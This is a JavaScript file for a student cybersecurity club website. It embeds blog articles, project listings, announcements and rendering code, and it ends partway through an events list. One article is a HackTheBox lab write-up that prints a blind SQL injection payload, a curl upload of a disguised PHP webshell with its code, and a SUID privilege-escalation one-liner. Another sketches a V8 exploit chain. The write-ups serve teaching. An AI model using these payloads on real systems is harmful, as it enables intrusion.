const ARTICLES = {
  'ws-leaderboard': {
    title: 'Building a Real-time Leaderboard with Spring Boot WebSocket & Vanilla JS',
    author: 'Vũ Sơn Thái', date: '26.MAR.2026', category: 'WEB_DEV', categoryColor: '#60a5fa',
    content: `<p>Real-time features used to require polling — hammering your server every few seconds hoping something changed. WebSockets flip this model: a persistent, bidirectional channel where the server pushes updates the moment they happen.</p>
<h3>1. Setting Up STOMP over WebSocket in Spring Boot</h3>
<p>Add the <code class="text-primary">spring-boot-starter-websocket</code> dependency and enable STOMP messaging:</p>
<pre>@Configuration
@EnableWebSocketMessageBroker
public class WebSocketConfig implements WebSocketMessageBrokerConfigurer {
    @Override
    public void configureMessageBroker(MessageBrokerRegistry config) {
        config.enableSimpleBroker("/topic");
        config.setApplicationDestinationPrefixes("/app");
    }
    @Override
    public void registerStompEndpoints(StompEndpointRegistry registry) {
        registry.addEndpoint("/ws").withSockJS();
    }
}</pre>
<h3>2. Broadcasting Score Updates</h3>
<p>Any time a score changes, broadcast the full leaderboard to all subscribers on <code class="text-primary">/topic/leaderboard</code>:</p>
<pre>@Service
public class LeaderboardService {
    @Autowired private SimpMessagingTemplate broker;

    public void pushUpdate(List&lt;RankEntry&gt; rankings) {
        broker.convertAndSend("/topic/leaderboard", rankings);
    }
}</pre>
<h3>3. Vanilla JS Client — No Framework Required</h3>
<p>SockJS + the STOMP.js CDN client is all you need. Subscribe and re-render the DOM on every message:</p>
<pre>const socket = new SockJS('/ws');
const stomp  = Stomp.over(socket);

stomp.connect({}, () => {
  stomp.subscribe('/topic/leaderboard', msg => {
    const data = JSON.parse(msg.body);
    renderLeaderboard(data);
  });
});</pre>
<p>The <code class="text-primary">renderLeaderboard</code> function just maps the array to table rows — pure DOM manipulation, zero dependencies. Total client-side payload: ~12 KB gzipped.</p>
<h3>Key Takeaways</h3>
<ul>
  <li>STOMP over SockJS gives you graceful fallback to long-polling for clients that block WebSockets.</li>
  <li>Broadcast full snapshots, not deltas — simpler client logic and idempotent updates.</li>
  <li>For high-frequency updates, debounce the broadcast (e.g. max once per 200ms).</li>
</ul>`
  },
  'segment-tree': {
    title: 'Segment Trees & Lazy Propagation: Cracking ICPC Asia Regional Problems',
    author: 'Triệu Quang Thiện', date: '20.MAR.2026', category: 'ALGORITHMS', categoryColor: '#facc15',
    content: `<p>Range-update, range-query problems are ICPC staples. A naive approach is O(n) per query; a segment tree with lazy propagation brings this down to O(log n) — the difference between AC and TLE on a 10⁵-node array.</p>
<h3>The Core Idea of Lazy Propagation</h3>
<p>Instead of propagating every update down to the leaves immediately, we store a <em>pending</em> update at each node and push it down only when we need to visit the children. This defers work until it's actually necessary.</p>
<pre>void pushDown(int node) {
    if (lazy[node] != 0) {
        for (int child : {2*node, 2*node+1}) {
            tree[child] += lazy[node] * segLen[child];
            lazy[child] += lazy[node];
        }
        lazy[node] = 0;
    }
}

void update(int node, int l, int r, int ql, int qr, long val) {
    if (qr &lt; l || r &lt; ql) return;
    if (ql &lt;= l && r &lt;= qr) {
        tree[node] += val * (r - l + 1);
        lazy[node] += val;
        return;
    }
    pushDown(node);
    int mid = (l + r) / 2;
    update(2*node, l, mid, ql, qr, val);
    update(2*node+1, mid+1, r, ql, qr, val);
    tree[node] = tree[2*node] + tree[2*node+1];
}</pre>
<h3>ICPC 2025 Asia — Problem F Breakdown</h3>
<p>The problem required both range-add updates and range-sum queries on a persistent version of the array (after each update, you could query any historical version). The solution: a persistent segment tree where each update creates a new root by copying only the O(log n) nodes on the update path.</p>
<h3>Complexity Summary</h3>
<ul>
  <li>Build: O(n)</li>
  <li>Range update: O(log n)</li>
  <li>Range query: O(log n)</li>
  <li>Persistent variant memory: O(n + q·log n)</li>
</ul>`
  },
  'v8-exploit': {
    title: 'Pwn2Own 2026: Exploiting the V8 JavaScript Engine',
    author: 'Nguyễn Thái Sơn', date: '15.MAR.2026', category: 'CTF_WRITEUP', categoryColor: '#c084fc',
    content: `<p>This write-up documents a Type Confusion vulnerability in V8's optimizing compiler (TurboFan) that was demonstrated at Pwn2Own 2026, leading to a full renderer RCE in Chrome 123.</p>
<h3>Root Cause: Type Confusion in TurboFan</h3>
<p>TurboFan aggressively optimizes based on type feedback. When an object's hidden class (shape) changes after the JIT has already emitted specialized code, the engine can be tricked into treating a <code class="text-primary">HeapNumber</code> as a raw pointer — a classic type confusion primitive.</p>
<pre>// Trigger JIT with consistent type feedback
function trigger(arr) {
    return arr[0] + arr[1];
}
// Warm up with doubles
for (let i = 0; i &lt; 10000; i++) trigger([1.1, 2.2]);

// Now confuse the type — causes OOB read/write primitive
trigger(confusedObj);</pre>
<h3>From Type Confusion to Arbitrary Read/Write</h3>
<p>The type confusion gives us a controlled out-of-bounds access on the V8 heap. From there:</p>
<ol>
  <li>Leak a <code class="text-primary">ArrayBuffer</code> backing store pointer via the OOB read.</li>
  <li>Overwrite the backing store pointer of a second <code class="text-primary">ArrayBuffer</code> to point anywhere in memory.</li>
  <li>Use the second buffer as an arbitrary read/write primitive.</li>
</ol>
<h3>Sandbox Escape</h3>
<p>V8's sandbox confines the heap, so we additionally corrupted a <code class="text-primary">WasmInstanceObject</code>'s imported function table to redirect execution outside the sandbox, ultimately calling <code class="text-primary">system()</code> via a ROP chain in libc.</p>
<p class="article-warning">⚠ This write-up is for educational purposes. The vulnerability was reported to Google and patched in Chrome 124.0.6367.60.</p>`
  },
  'llama-vn': {
    title: 'Fine-tuning LLaMA 3.1 for Vietnamese Sentiment Analysis',
    author: 'Vương Trần Lâm Bình', date: '10.MAR.2026', category: 'AI_ML', categoryColor: '#f472b6',
    content: `<p>Large language models trained primarily on English struggle with Vietnamese — especially informal social media text with heavy use of teencode and regional slang. We fine-tuned LLaMA 3.1-8B using LoRA adapters on a custom Vietnamese dataset and benchmarked against GPT-4o.</p>
<h3>Dataset: VnSentiment-50k</h3>
<p>50,000 manually labelled comments scraped from Facebook groups and Shopee reviews across 3 sentiment classes: positive, neutral, negative. Class distribution: 42% positive, 31% neutral, 27% negative. Preprocessing included Unicode normalization and teencode expansion using a custom dictionary of ~3,400 mappings.</p>
<h3>LoRA Configuration</h3>
<pre>from peft import LoraConfig, get_peft_model

config = LoraConfig(
    r=16,
    lora_alpha=32,
    target_modules=["q_proj", "v_proj"],
    lora_dropout=0.05,
    bias="none",
    task_type="CAUSAL_LM"
)
model = get_peft_model(base_model, config)
# Trainable params: 6.7M / 8.03B total (0.08%)</pre>
<h3>Results vs. GPT-4o</h3>
<table>
  <thead><tr><th>Model</th><th>Accuracy</th><th>F1 (macro)</th></tr></thead>
  <tbody>
    <tr><td>LLaMA 3.1-8B (base)</td><td>61.2%</td><td>0.58</td></tr>
    <tr><td>LLaMA 3.1-8B + LoRA (ours)</td><td style="color:#8eff71;font-weight:700">83.7%</td><td style="color:#8eff71;font-weight:700">0.82</td></tr>
    <tr><td>GPT-4o (zero-shot)</td><td>79.4%</td><td>0.77</td></tr>
  </tbody>
</table>
<p>Fine-tuning a much smaller model on domain-specific Vietnamese data outperformed GPT-4o zero-shot by 4.3 percentage points — at a fraction of the inference cost.</p>`
  },
  'docker-cicd': {
    title: 'Containerizing Spring Boot with Docker & GitHub Actions CI/CD',
    author: 'Nguyễn Thu Ngọc', date: '05.MAR.2026', category: 'WEB_DEV', categoryColor: '#60a5fa',
    content: `<p>From a bare Spring Boot JAR to a fully automated Docker Hub push on every merge to main — this is the pipeline we set up for the CyberTitans backend.</p>
<h3>Multi-Stage Dockerfile</h3>
<p>A two-stage build keeps the final image lean: build in a JDK image, copy only the JAR into a slim JRE runtime.</p>
<pre># Stage 1: build
FROM maven:3.9-eclipse-temurin-21 AS builder
WORKDIR /app
COPY pom.xml .
RUN mvn dependency:go-offline
COPY src ./src
RUN mvn package -DskipTests

# Stage 2: runtime
FROM eclipse-temurin:21-jre-alpine
WORKDIR /app
COPY --from=builder /app/target/*.jar app.jar
EXPOSE 8080
ENTRYPOINT ["java", "-jar", "app.jar"]</pre>
<h3>GitHub Actions Pipeline</h3>
<pre>name: CI/CD
on:
  push:
    branches: [main]
jobs:
  build-and-push:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: docker/login-action@v3
        with:
          username: \${{ secrets.DOCKER_USER }}
          password: \${{ secrets.DOCKER_TOKEN }}
      - uses: docker/build-push-action@v5
        with:
          push: true
          tags: cybertitans/backend:latest,\${{ github.sha }}</pre>
<h3>Results</h3>
<ul>
  <li>Final image size: <span class="text-white">187 MB</span> (vs. ~600 MB with full JDK)</li>
  <li>Average CI time: <span class="text-white">2m 40s</span> with Maven dependency caching</li>
  <li>Zero-downtime deploys via Docker Compose <code class="text-primary">--no-deps --build</code> rolling restart</li>
</ul>`
  },
  'sqli-rce': {
    title: 'SQL Injection to RCE: Cracking the HackTheBox "Fortress" Machine',
    author: 'Nguyễn Văn Lợi', date: '02.MAR.2026', category: 'CTF_WRITEUP', categoryColor: '#c084fc',
    content: `<p>Fortress is a hard-rated HTB machine that chains a blind SQLi in the login form with an unrestricted file upload endpoint to land a reverse shell. Here's the full kill chain.</p>
<h3>Step 1: Enumerate the Blind SQLi</h3>
<p>The login form was vulnerable to a time-based blind injection in the <code class="text-primary">username</code> parameter. Confirmed with a sleep payload:</p>
<pre>username=admin' AND SLEEP(5)-- -&password=x
# Response time jumped from ~80ms to ~5080ms ✓</pre>
<p>Used <code class="text-primary">sqlmap --level=3 --risk=2</code> to dump the <code class="text-primary">users</code> table and crack the admin bcrypt hash offline with hashcat (rockyou.txt, mode 3200).</p>
<h3>Step 2: File Upload to Webshell</h3>
<p>The authenticated file upload endpoint accepted any <code class="text-primary">Content-Type</code>. A PHP webshell disguised as a JPEG bypassed the client-side extension check:</p>
<pre>curl -b "session=&lt;token&gt;" \
  -F "file=@shell.php.jpg;type=image/jpeg" \
  http://fortress.htb/upload

# shell.php.jpg contents:
&lt;?php system($_GET['cmd']); ?&gt;</pre>
<h3>Step 3: Reverse Shell & Privilege Escalation</h3>
<p>Triggered the webshell to download and execute a netcat reverse shell. Privesc was a classic SUID <code class="text-primary">find</code> binary:</p>
<pre>find / -name . -exec /bin/sh -p \; -quit
# uid=33(www-data) → uid=0(root) ✓</pre>
<p class="article-warning">⚠ All techniques demonstrated against an isolated HTB lab environment for educational purposes only.</p>`
  }
};

function openArticle(key) {
    const a = ARTICLES[key];
    if (!a) return;

    const set = (id, val, prop = 'textContent') => { const el = document.getElementById(id); if (el) el[prop] = val; };

    set('article-title', a.title);
    set('article-date', a.date);
    set('article-author', a.author);
    set('article-content', a.content, 'innerHTML');

    // Category badge
    const badge = document.getElementById('article-category-badge');
    if (badge) {
        badge.textContent = a.category;
        badge.style.color = a.categoryColor;
        badge.style.borderColor = a.categoryColor + '44';
        badge.style.background = a.categoryColor + '11';
    }

    // Author initials avatar
    const av = document.getElementById('article-author-avatar');
    if (av) {
        av.textContent = (a.author || '').split(' ').map(w => w[0]).join('').slice(0, 2).toUpperCase();
        av.style.background = ['#1a3a2a','#1e3a5f','#3d1a42','#3d2b00'][(a.author||'').charCodeAt(0) % 4];
    }

    openModal('article-modal');
    const panel = document.getElementById('article-modal-panel');
    if (panel) panel.scrollTop = 0;
}

async function buildTeam() {
    const container = document.getElementById('team-grid-container');
    if (!container) return;
    try {
        const response = await fetch(`${API_BASE_URL}/team/members`);
        const teamData = await response.json();
        const _initials = name => (name || '?').split(' ').map(w => w[0]).join('').slice(0, 2).toUpperCase();
        const _avatarBg = name => ['#1a3a2a','#1e3a5f','#3d1a42','#3d2b00','#1a2e3a','#2d1a1a'][(name||'').charCodeAt(0) % 6];
        const _teamAvatar = (m, cls) => m.avatar
            ? `<img src="${m.avatar}" class="${cls}" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'"/><div class="${cls} hidden items-center justify-center font-headline font-bold text-2xl text-primary border border-primary/30" style="display:none;background:${_avatarBg(m.name)}">${_initials(m.name)}</div>`
            : `<div class="${cls} flex items-center justify-center font-headline font-bold text-2xl text-primary border border-primary/30" style="background:${_avatarBg(m.name)}">${_initials(m.name)}</div>`;
        container.innerHTML = teamData.map(m => `
            <div class="hack-card p-6 border transition-all duration-300">
                <div class="scanner"></div>
                ${_teamAvatar(m, 'w-full aspect-square object-cover mb-4 grayscale hover:grayscale-0 transition-all')}
                <div class="space-y-1">
                    <h4 class="text-white font-bold text-lg font-headline">${m.name}</h4>
                    <p class="text-primary font-mono text-xs uppercase tracking-widest">${m.role}</p>
                </div>
                <div class="mt-4 border-t border-white/10 pt-4 text-center">
                    <button onclick="openProfileModal(${m.id})" class="text-primary font-mono text-[10px] uppercase border border-primary/20 px-4 py-1 hover:bg-primary hover:text-black transition-all">VIEW PROFILE</button>
                </div>
            </div>`).join('');
    } catch (err) { console.error("Team error:", err); }
}

async function buildRanking() {
    const podiumContainer = document.getElementById('podium-container');
    const listContainer = document.getElementById('ranking-list-container');
    if (!podiumContainer || !listContainer) return;
    try {
        const response = await fetch(`${API_BASE_URL}/ranking`);
        const rankingData = await response.json();
        const layout = [
            { idx: 1, color: '#e5e7eb', shadow: 'rgba(229,231,235,0.4)', pad: 'pt-16 pb-4' }, 
            { idx: 0, color: '#fbbf24', shadow: 'rgba(251,191,36,0.5)', pad: 'pt-20 pb-6' },  
            { idx: 2, color: '#f97316', shadow: 'rgba(249,115,22,0.4)', pad: 'pt-14 pb-4' }   
        ];
        podiumContainer.innerHTML = layout.map(pos => {
            const u = rankingData[pos.idx];
            if (!u) return '';
            const initials = u.name.split(' ').map(n => n[0]).join('').substring(0, 2).toUpperCase();
            return `
                <div class="flex flex-col items-center w-[30%] relative">
                    <div class="relative z-10 mb-[-40px]">
                        <div class="w-20 h-20 sm:w-28 sm:h-28 rounded-full border-2 flex items-center justify-center font-bold text-2xl text-white bg-[#1a1a1a] shadow-[0_0_20px_${pos.shadow}]" style="border-color: ${pos.color}">${initials}</div>
                    </div>
                    <div class="w-full bg-[#0a0a0a] border-t-2 flex flex-col items-center px-2 ${pos.pad}" style="border-color: ${pos.color}">
                        <h3 class="text-white text-xs font-bold truncate w-full text-center">${u.name}</h3>
                        <p class="text-mono font-bold text-white mt-2">${u.point.toLocaleString()}</p>
                    </div>
                </div>`;
        }).join('');
        listContainer.innerHTML = rankingData.slice(3).map((u, i) => `
            <div class="flex items-center justify-between p-4 bg-[#111] border-l-2 border-white/5 hover:border-primary mb-2 group transition-all">
                <div class="flex items-center gap-4">
                    <span class="font-mono text-gray-500 w-8 text-center">${(i + 4).toString().padStart(2, '0')}</span>
                    <h4 class="text-white font-bold group-hover:text-primary">${u.name}</h4>
                </div>
                <div class="font-mono text-white">${u.point.toLocaleString()} <span class="text-gray-500 text-xs">PTS</span></div>
            </div>`).join('');
    } catch (err) { console.error("Ranking error:", err); }
}

const STATIC_PROJECTS = [
    {
        id: 1, name: 'CyberTitans Web Platform', status: 'ACTIVE',
        description: 'Full-stack club management system built with Spring Boot and Vanilla JS. Features member profiles, mentor matching, dynamic CV generation, and a Cyber Coin economy.',
        techStack: ['Spring Boot', 'Java', 'MySQL', 'Tailwind CSS', 'Vanilla JS'],
        members: [
            { memberName: 'Vũ Sơn Thái',   role: 'Lead Dev'  },
            { memberName: 'Nguyễn Minh Khoa', role: 'Backend'  },
            { memberName: 'Trần Thị Lan',   role: 'Frontend' }
        ],
        totalTasks: 24, completedTasks: 18
    },
    {
        id: 2, name: 'CTF Automated Scorer', status: 'ACTIVE',
        description: 'Real-time Capture The Flag scoring engine with dynamic flag verification, team leaderboards via WebSocket, and Docker-based challenge sandboxing.',
        techStack: ['Python', 'FastAPI', 'Docker', 'Redis', 'WebSocket'],
        members: [
            { memberName: 'Lê Hoàng Nam',   role: 'Architect' },
            { memberName: 'Phạm Quốc Huy',  role: 'DevOps'    }
        ],
        totalTasks: 16, completedTasks: 10
    },
    {
        id: 3, name: 'Network Intrusion Detector', status: 'IN_PROGRESS',
        description: 'ML-based IDS that classifies network traffic using a Random Forest model trained on the NSL-KDD dataset. Achieves 97.4% accuracy on test set.',
        techStack: ['Python', 'Scikit-learn', 'Pandas', 'Wireshark', 'Flask'],
        members: [
            { memberName: 'Đỗ Thanh Tùng',  role: 'ML Engineer' },
            { memberName: 'Bùi Thị Mai',    role: 'Data Analyst' },
            { memberName: 'Nguyễn Văn An',  role: 'Backend'      }
        ],
        totalTasks: 20, completedTasks: 13
    },
    {
        id: 4, name: 'SecureVault Password Manager', status: 'COMPLETED',
        description: 'End-to-end encrypted password manager with AES-256 vault storage, TOTP-based 2FA, and a browser extension for auto-fill. Open-sourced on the club GitHub.',
        techStack: ['React', 'Node.js', 'AES-256', 'TOTP', 'MongoDB'],
        members: [
            { memberName: 'Hoàng Thị Thu',  role: 'Full Stack' },
            { memberName: 'Trần Minh Đức',  role: 'Security'   }
        ],
        totalTasks: 18, completedTasks: 18
    }
];

async function buildProjects() {
    const container = document.getElementById('projects-container');
    if (!container) return;
    try {
        const response = await fetch(`${API_BASE_URL}/projects`);
        if (!response.ok) throw new Error('fetch failed');
        const projects = await response.json();
        const data = projects.length ? projects : STATIC_PROJECTS;
        container.innerHTML = data.map(p => _buildProjectCard(p)).join('');
        requestAnimationFrame(() => {
            container.querySelectorAll('.skill-bar-fill[data-w]').forEach(el => {
                el.style.width = el.dataset.w + '%';
            });
        });
    } catch (err) {
        container.innerHTML = STATIC_PROJECTS.map(p => _buildProjectCard(p)).join('');
        requestAnimationFrame(() => {
            container.querySelectorAll('.skill-bar-fill[data-w]').forEach(el => {
                el.style.width = el.dataset.w + '%';
            });
        });
    }
}

function _buildProjectCard(p) {
    const st = _projectStatusTag(p.status);
    const progress = p.totalTasks ? Math.round((p.completedTasks / p.totalTasks) * 100) : 0;
    const techTags = (p.techStack || []).map(t =>
        `<span class="tag-secondary pf-skill-tag">${t}</span>`
    ).join('');
    const memberRows = (p.members || []).slice(0, 3).map(m => `
        <div class="flex items-center gap-2">
            <div class="w-5 h-5 bg-[#1a1a1a] border border-white/10 flex items-center justify-center font-mono text-[9px] text-primary">${m.memberName.charAt(0).toUpperCase()}</div>
            <span class="font-mono text-[10px] text-gray-400 flex-1 truncate">${m.memberName}</span>
            <span class="tag-tertiary pf-skill-tag">${m.role}</span>
        </div>`).join('');
    return `
        <div class="hack-card p-6 card-lift">
            <div class="scanner"></div>
            <div class="flex items-start justify-between mb-4">
                <div>
                    <p class="font-mono text-[10px] uppercase tracking-[0.2em] text-gray-500 mb-1">/PROJECT</p>
                    <h3 class="font-headline text-xl font-bold text-white">${p.name}</h3>
                </div>
                <span class="${st.cls} pf-skill-tag">${st.label}</span>
            </div>
            <p class="font-mono text-xs text-gray-500 mb-4 leading-relaxed">${p.description || '—'}</p>
            <div class="flex flex-wrap gap-2 mb-4">${techTags}</div>
            ${memberRows ? `<div class="border-t border-white/5 pt-4 mb-4 space-y-2">${memberRows}</div>` : ''}
            <div class="mb-5">
                <div class="flex justify-between font-mono text-[10px] mb-1 text-gray-500">
                    <span>TASKS</span><span>${p.completedTasks || 0} / ${p.totalTasks || 0}</span>
                </div>
                <div class="skill-bar">
                    <div class="skill-bar-fill verified" style="width:0%" data-w="${progress}"></div>
                </div>
            </div>
            <button onclick="openProjectAnalytics(${p.id})" class="w-full text-primary font-mono text-[10px] uppercase border border-primary/20 px-4 py-2 hover:bg-primary hover:text-black transition-all">
                View Analytics
            </button>
        </div>`;
}

function _projectStatusTag(status) {
    switch ((status || '').toUpperCase()) {
        case 'ACTIVE':
        case 'IN_PROGRESS': return { cls: 'tag-primary',   label: status };
        case 'COMPLETED':   return { cls: 'tag-gold',      label: 'COMPLETED' };
        case 'ON_HOLD':
        case 'PAUSED':      return { cls: 'tag-tertiary',  label: status };
        default:            return { cls: 'tag-secondary', label: status || 'UNKNOWN' };
    }
}

async function openProjectAnalytics(id) {
    openModal('project-analytics-modal');
    const body = document.getElementById('project-analytics-body');
    body.innerHTML = `<p class="font-mono text-xs text-gray-500 animate-pulse text-center py-10 uppercase tracking-widest">Loading data...</p>`;
    try {
        const response = await fetch(`${API_BASE_URL}/projects/${id}`);
        if (!response.ok) throw new Error('not found');
        const p = await response.json();
        const st = _projectStatusTag(p.status);
        const techTags = (p.techStack || []).map(t =>
            `<span class="tag-secondary pf-skill-tag">${t}</span>`
        ).join('');
        const rows = (p.contributions || []).map(c => {
            const pct = c.totalTasks ? Math.round((c.tasksCompleted / c.totalTasks) * 100) : 0;
            return `
                <div class="bg-[#111] border border-white/5 p-4">
                    <div class="flex items-center justify-between mb-3">
                        <div class="flex items-center gap-3">
                            <div class="w-8 h-8 bg-[#1a1a1a] border border-white/10 flex items-center justify-center font-headline font-bold text-primary text-sm">${c.memberName.charAt(0).toUpperCase()}</div>
                            <div>
                                <p class="text-white font-bold text-sm">${c.memberName}</p>
                                <p class="font-mono text-[10px] text-gray-500 uppercase">${c.role}</p>
                            </div>
                        </div>
                        <span class="font-mono text-xs text-primary">${c.tasksCompleted} / ${c.totalTasks} tasks</span>
                    </div>
                    <div class="skill-bar">
                        <div class="skill-bar-fill verified" style="width:0%" data-w="${pct}"></div>
                    </div>
                </div>`;
        }).join('');
        body.innerHTML = `
            <div class="flex items-start justify-between mb-3">
                <h3 class="font-headline text-2xl font-bold text-white">${p.name}</h3>
                <span class="${st.cls} pf-skill-tag ml-4 shrink-0">${st.label}</span>
            </div>
            <p class="font-mono text-xs text-gray-500 mb-4 leading-relaxed">${p.description || ''}</p>
            <div class="flex flex-wrap gap-2 mb-6">${techTags}</div>
            <div class="flex items-center gap-2 mb-3">
                <div class="w-3 h-3 bg-primary"></div>
                <span class="font-mono text-[10px] uppercase tracking-widest text-primary">Contribution Analytics</span>
            </div>
            <div class="space-y-3">${rows || '<p class="font-mono text-xs text-gray-500 text-center py-4">No contribution data yet.</p>'}</div>`;
        requestAnimationFrame(() => {
            body.querySelectorAll('.skill-bar-fill[data-w]').forEach(el => {
                el.style.width = el.dataset.w + '%';
            });
        });
    } catch (err) {
        body.innerHTML = `<p class="font-mono text-xs text-red-400 text-center py-10">[ Failed to load project data ]</p>`;
    }
}

function buildPublications() {}

// ─── ANNOUNCEMENTS ───────────────────────────────────────────────────────────

const ANNOUNCEMENTS = [
  {
    id: 'ann-001', type: 'EVENT',
    title: 'IU Spring Hackathon 2026 — Registration Now Open',
    body: 'Registration for the IU Spring Hackathon 2026 is officially open. Form a team of 2–4 and register before April 5th to compete for prizes and earn contribution points toward your portfolio.',
    date: '28.MAR.2026'
  },
  {
    id: 'ann-002', type: 'SYSTEM',
    title: 'Mentor Reputation Rankings Recalculated for Q1 2026',
    body: 'Q1 2026 reputation scores have been updated across all mentor profiles. Rankings now reflect completed mentorship sessions, community upvotes, and verified project guidance outcomes.',
    date: '27.MAR.2026'
  },
  {
    id: 'ann-003', type: 'EVENT',
    title: 'Workshop: Web Exploitation Basics — April 2 @ 14:00',
    body: 'Join us in Room B208 on April 2nd at 14:00 for a hands-on session covering SQL injection, XSS, and CSRF. Attendance is tracked and counts toward your portfolio. Open to all skill levels.',
    date: '25.MAR.2026'
  },
  {
    id: 'ann-004', type: 'MENTOR',
    title: 'Mentorship Program Is Now Live',
    body: 'The CyberTitans Mentorship Program is officially active. Browse available mentors on the Programs page, filter by skill, and send a request using 500 Cyber Coins to start your 1-on-1 sessions.',
    date: '24.MAR.2026'
  },
  {
    id: 'ann-005', type: 'SYSTEM',
    title: 'Portal Update — Verified Portfolio & CV Export',
    body: 'The member portal has been updated with the new Verified Portfolio and CV Export feature. Navigate to your Profile and click "MY PORTFOLIO" to generate a print-ready version of your proof-of-work.',
    date: '20.MAR.2026'
  },
  {
    id: 'ann-006', type: 'INFO',
    title: 'Club Privacy Policy Updated',
    body: 'Our privacy policy has been revised to reflect current data handling practices. Key changes include clarity on member data retention periods and portfolio visibility settings. Review the full policy in the FAQ section.',
    date: '15.MAR.2026'
  }
];

const _ANN_META = {
  EVENT:  { color: '#60a5fa', label: 'EVENT',  icon: 'calendar_month' },
  SYSTEM: { color: '#D4AF37', label: 'SYSTEM', icon: 'settings'       },
  MENTOR: { color: '#8eff71', label: 'MENTOR', icon: 'school'          },
  INFO:   { color: '#c084fc', label: 'INFO',   icon: 'info'            }
};

function _getReadIds() {
  try { return JSON.parse(localStorage.getItem('read_announcements') || '[]'); } catch { return []; }
}

function _markReadId(id) {
  const read = _getReadIds();
  if (!read.includes(id)) { read.push(id); localStorage.setItem('read_announcements', JSON.stringify(read)); }
}

function _updateBellBadge() {
  const read = _getReadIds();
  const count = ANNOUNCEMENTS.filter(a => !read.includes(a.id)).length;
  const badge = document.getElementById('notif-badge');
  if (!badge) return;
  if (count > 0) {
    badge.textContent = count > 9 ? '9+' : String(count);
    badge.classList.remove('hidden');
  } else {
    badge.classList.add('hidden');
  }
}

function openAnnouncementsPanel() {
  const backdrop = document.getElementById('announcements-backdrop');
  const panel    = document.getElementById('announcements-panel');
  if (backdrop) backdrop.classList.remove('hidden');
  if (panel)    panel.classList.add('open');
  document.body.style.overflow = 'hidden';
  _renderAnnPanel();
}

function closeAnnouncementsPanel() {
  const backdrop = document.getElementById('announcements-backdrop');
  const panel    = document.getElementById('announcements-panel');
  if (backdrop) backdrop.classList.add('hidden');
  if (panel)    panel.classList.remove('open');
  document.body.style.overflow = '';
}

function markAllAnnouncementsRead() {
  localStorage.setItem('read_announcements', JSON.stringify(ANNOUNCEMENTS.map(a => a.id)));
  _updateBellBadge();
  _renderAnnPanel();
  _renderAnnPage();
}

function viewAnnouncement(id) {
  _markReadId(id);
  _updateBellBadge();
  _renderAnnPanel();
  _renderAnnPage();
}

function _renderAnnPanel() {
  const container = document.getElementById('ann-panel-list');
  if (!container) return;
  const read = _getReadIds();
  container.innerHTML = ANNOUNCEMENTS.map(a => {
    const t = _ANN_META[a.type] || _ANN_META.INFO;
    const isRead = read.includes(a.id);
    return `
      <div class="border-b border-white/5 px-5 py-4 hover:bg-white/[0.025] transition-colors cursor-pointer ${isRead ? 'opacity-55' : ''}"
           onclick="viewAnnouncement('${a.id}')">
        <div class="flex items-start gap-3">
          <div class="w-7 h-7 flex items-center justify-center flex-shrink-0 mt-0.5"
               style="background:${t.color}15;border:1px solid ${t.color}35">
            <span class="material-symbols-outlined text-[14px]" style="color:${t.color}">${t.icon}</span>
          </div>
          <div class="flex-1 min-w-0">
            <div class="flex items-center justify-between gap-2 mb-1">
              <span class="font-mono text-[9px] uppercase tracking-widest" style="color:${t.color}">${t.label}</span>
              <span class="font-mono text-[9px] text-gray-500 flex-shrink-0">${a.date}</span>
            </div>
            <p class="text-sm text-white font-bold leading-tight mb-1">${a.title}</p>
            <p class="text-xs text-gray-500 font-mono leading-relaxed line-clamp-2">${a.body}</p>
          </div>
          <div class="w-1.5 h-1.5 rounded-full flex-shrink-0 mt-2 ${isRead ? 'opacity-0' : 'bg-primary'}"></div>
        </div>
      </div>`;
  }).join('');
}

function _renderAnnPage(filterType) {
  const container = document.getElementById('ann-page-list');
  if (!container) return;
  const read = _getReadIds();
  const items = (filterType && filterType !== 'ALL')
    ? ANNOUNCEMENTS.filter(a => a.type === filterType)
    : ANNOUNCEMENTS;
  if (!items.length) {
    container.innerHTML = `<div class="text-center py-20 font-mono text-gray-500 text-xs uppercase tracking-widest">[ No announcements ]</div>`;
    return;
  }
  container.innerHTML = items.map(a => {
    const t = _ANN_META[a.type] || _ANN_META.INFO;
    const isRead = read.includes(a.id);
    return `
      <div class="group bg-[#0a0a0a] border ${isRead ? 'border-white/5' : 'border-primary/15'} p-6 relative overflow-hidden hover:border-primary/40 transition-all duration-300 cursor-pointer"
           onclick="viewAnnouncement('${a.id}')">
        <div class="absolute top-0 left-[-100%] w-full h-[2px] group-hover:left-0 transition-all duration-500"
             style="background:${t.color}"></div>
        <div class="flex items-start gap-4">
          <div class="w-10 h-10 flex items-center justify-center flex-shrink-0"
               style="background:${t.color}15;border:1px solid ${t.color}40">
            <span class="material-symbols-outlined text-[18px]" style="color:${t.color}">${t.icon}</span>
          </div>
          <div class="flex-1 min-w-0">
            <div class="flex flex-wrap items-center gap-3 mb-2">
              <span class="font-mono text-[10px] uppercase tracking-widest px-2 py-0.5 border"
                    style="color:${t.color};border-color:${t.color}44;background:${t.color}11">${t.label}</span>
              <span class="font-mono text-[10px] text-gray-500">${a.date}</span>
              ${!isRead ? '<span class="font-mono text-[9px] text-primary uppercase tracking-widest animate-pulse">● NEW</span>' : ''}
            </div>
            <h3 class="text-white font-bold text-lg leading-tight mb-2 group-hover:text-primary transition-colors">${a.title}</h3>
            <p class="text-gray-400 text-sm font-mono leading-relaxed">${a.body}</p>
          </div>
        </div>
      </div>`;
  }).join('');
}

function filterAnnouncements(type, btn) {
  document.querySelectorAll('#ann-filter-bar button').forEach(b => {
    b.classList.remove('text-primary', 'border-primary');
    b.classList.add('text-gray-500', 'border-transparent');
  });
  btn.classList.remove('text-gray-500', 'border-transparent');
  btn.classList.add('text-primary', 'border-primary');
  _renderAnnPage(type);
}

function buildAnnouncements() {
  _updateBellBadge();
  _renderAnnPage();
}

// ─── EVENTS ──────────────────────────────────────────────────────────────────

const EVENTS = [
  {
    id: 'evt-001', type: 'HACKATHON', typeColor: '#D4AF37',
    title: 'IU Spring Hackathon 2026',
    date: '12.APR.2026', time: '08:00 — 20:00',
    location: 'Hall A, IU Campus',
    description: 'A 12-hour team hackathon open to all IU students. Build a working prototype around the theme "Secure By Design". Prizes include internship opportunities and Cyber Coins.',
    capacity: 50
  },
  {
    id: 'evt-002', type: 'WORKSHOP', typeColor: '#60a5fa',
    title: 'Web Exploitation Basics',
    date: '02.APR.2026', time: '14:00 — 17:00',
    location: 'Room B208, IU Campus',
    description: 'Hands-on session covering SQL injection, XSS, CSRF, and SSRF. Bring your laptop. Attendance earns 50 Cyber Coins and is recorded in your verified portfolio.',
